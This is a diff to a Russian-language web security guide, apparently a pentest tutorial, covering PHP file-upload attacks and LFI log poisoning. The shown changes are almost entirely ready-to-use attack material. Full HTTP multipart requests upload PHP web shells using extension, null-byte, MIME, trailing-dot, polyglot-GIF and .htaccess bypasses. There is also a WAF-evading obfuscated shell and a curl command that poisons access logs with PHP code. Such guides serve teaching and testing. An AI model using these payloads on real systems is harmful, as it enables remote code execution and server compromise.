@@ -212,7 +212,7 @@ require($page . '.php'); // Намерение: home.php
 4. **Log Poisoning - внедрение через логи:**
 ```bash
 # 1. Отравляем User-Agent в access.log:
-curl -A "<?php system(\$_GET['cmd']); ?>" http://site.com/
+curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
 
 # 2. Подключаем лог файл:
 ?page=../../../../var/log/apache2/access.log&cmd=id
@@ -447,48 +447,101 @@ if (in_array($ext, ['jpg', 'png', 'gif'])) {
 **Реальная эксплуатация:**
 
 **1. Прямая загрузка PHP shell:**
-```php
-// shell.php
-<?php system($_GET['cmd']); ?>
-```
-```bash
-# Загружаем через форму, затем:
-curl http://site.com/uploads/shell.php?cmd=whoami
-```
-
-**2. Обход через двойное расширение:**
-```bash
-# Загружаем файл: shell.php.jpg
-# Некоторые серверы могут обработать как PHP
-curl http://site.com/uploads/shell.php.jpg?cmd=id
-```
-
-**3. Обход через null byte (PHP < 5.3.4):**
-```bash
-# Имя файла: shell.php%00.jpg
-# PHP обрежет после %00, файл сохранится как shell.php
-```
-
-**4. Обход через Content-Type manipulation:**
-```bash
+```http
 POST /upload.php HTTP/1.1
+Host: target.com
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
 
 ------WebKitFormBoundary
 Content-Disposition: form-data; name="file"; filename="shell.php"
-Content-Type: image/jpeg    # ← Подделываем MIME type
+Content-Type: application/octet-stream
+
+<?php system($_GET['cmd']); ?>
+------WebKitFormBoundary--
+```
+Если нет валидации, файл загружается напрямую.
+Доступ: http://target.com/uploads/shell.php?cmd=whoami
+
+**2. Обход через двойное расширение:**
+```http
+POST /upload.php HTTP/1.1
+Host: target.com
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+------WebKitFormBoundary
+Content-Disposition: form-data; name="file"; filename="shell.php.jpg" //<= Добавляем двойное расширение
+Content-Type: image/jpeg
+
+<?php system($_GET['cmd']); ?>
+------WebKitFormBoundary--
+```
+Некоторые серверы обрабатывают первое расширение (.php).
+Доступ: http://target.com/uploads/shell.php.jpg?cmd=id
+
+**3. Обход через null byte (PHP < 5.3.4):**
+```http
+POST /upload.php HTTP/1.1
+Host: target.com
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+------WebKitFormBoundary
+Content-Disposition: form-data; name="file"; filename="shell.php%00.jpg" //<= Добавляем null byte
+Content-Type: image/jpeg
+
+<?php system($_GET['cmd']); ?>
+------WebKitFormBoundary--
+```
+PHP обрезает имя файла после null byte (%00), сохраняется как shell.php.
+Доступ: http://target.com/uploads/shell.php?cmd=whoami
+
+**4. Обход через Content-Type manipulation:**
+```http
+POST /upload.php HTTP/1.1
+Host: target.com
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+------WebKitFormBoundary
+Content-Disposition: form-data; name="file"; filename="shell.php"
+Content-Type: image/jpeg    <= Подделываем MIME type
 
 <?php system($_GET['cmd']); ?>
 ------WebKitFormBoundary--
 ```
 
 **5. Обход через case-sensitivity (Windows серверы):**
-```bash
-# Загружаем: shell.PhP или shell.pHp
-# Windows не различает регистр расширений
-```
+```http
+POST /upload.php HTTP/1.1
+Host: target.com
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
 
-**6. Комбинация File Upload + LFI:**
+------WebKitFormBoundary
+Content-Disposition: form-data; name="file"; filename="shell.PhP"
+Content-Type: application/octet-stream
+
+<?php system($_GET['cmd']); ?>
+------WebKitFormBoundary--
+```
+Windows не различает регистр расширений: .php = .PhP = .pHp
+Доступ: http://target.com/uploads/shell.PhP?cmd=whoami
+
+**6. Обход через точку в конце:**
+```http
+POST /upload.php HTTP/1.1
+Host: target.com
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+------WebKitFormBoundary
+Content-Disposition: form-data; name="file"; filename="shell.php."
+Content-Type: application/octet-stream
+
+<?php system($_GET['cmd']); ?>
+------WebKitFormBoundary--
+```
+ОС автоматически удаляет точку в конце имени файла, сохраняется как shell.php
+Работает на Windows и многих конфигурациях Linux.
+Доступ: http://target.com/uploads/shell.php?cmd=id
+
+**7. Комбинация File Upload + LFI:**
 ```php
 // Загружаем файл с PHP кодом под безопасным расширением
 // Имя файла: backdoor.txt
@@ -499,7 +552,7 @@ Content-Type: image/jpeg    # ← Подделываем MIME type
 // include() выполнит PHP код из .txt файла!
 ```
 
-**7. Phar + File Upload (advanced):**
+**8. Phar + File Upload (advanced):**
 ```bash
 # Создаём .phar с вредоносным объектом
 # Загружаем как .jpg (обходим фильтры)
@@ -508,34 +561,58 @@ Content-Type: image/jpeg    # ← Подделываем MIME type
 # Десериализация → RCE
 ```
 
-**8. Polyglot файлы (PHP + image):**
-```bash
-# Создаём файл который является валидным изображением И PHP кодом
-echo "GIF89a" > shell.gif              # GIF header
-echo '<?php system($_GET["c"]); ?>' >> shell.gif
+**9. Polyglot файлы (PHP + image):**
+```http
+POST /upload.php HTTP/1.1
+Host: target.com
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
 
-# Проходит проверку как изображение, но PHP интерпретирует код
-# Доступ: /uploads/shell.gif?c=whoami
+------WebKitFormBoundary
+Content-Disposition: form-data; name="file"; filename="avatar.gif"
+Content-Type: image/gif
+
+GIF89a    <= Валидный GIF header
+<?php system($_GET['c']); ?>
+------WebKitFormBoundary--
 ```
+Файл проходит проверку getimagesize(), но PHP интерпретирует код.
+Доступ: /uploads/avatar.gif?c=whoami
 
-**9. .htaccess upload для изменения конфигурации:**
-```apache
-# Загружаем .htaccess в директорию uploads/
+**10. .htaccess upload для изменения конфигурации:**
+```http
+POST /upload.php HTTP/1.1
+Host: target.com
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+------WebKitFormBoundary
+Content-Disposition: form-data; name="file"; filename=".htaccess"
+Content-Type: text/plain
+
 AddType application/x-httpd-php .jpg
-
-# Теперь все .jpg файлы обрабатываются как PHP!
-# Загружаем shell.jpg с PHP кодом → выполняется
+------WebKitFormBoundary--
 ```
+Теперь все .jpg в uploads/ обрабатываются как PHP!
+Затем загружаем shell.jpg с PHP кодом → выполняется.
 
-**10. Web shell обфускация:**
-```php
-// Обход сканеров и WAF
+**11. Web shell обфускация:**
+```http
+POST /upload.php HTTP/1.1
+Host: target.com
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+------WebKitFormBoundary
+Content-Disposition: form-data; name="file"; filename="image.php"
+Content-Type: application/x-php
+
 <?php
 $a = str_rot13('flfgrz');  // system
 $b = $_GET[base64_decode('Y21k')];  // cmd
 $a($b);
 ?>
+------WebKitFormBoundary--
 ```
+Обход сканеров и WAF через обфускацию.
+Доступ: /uploads/image.php?cmd=whoami
 
 **Техники валидации (что проверять):**
 
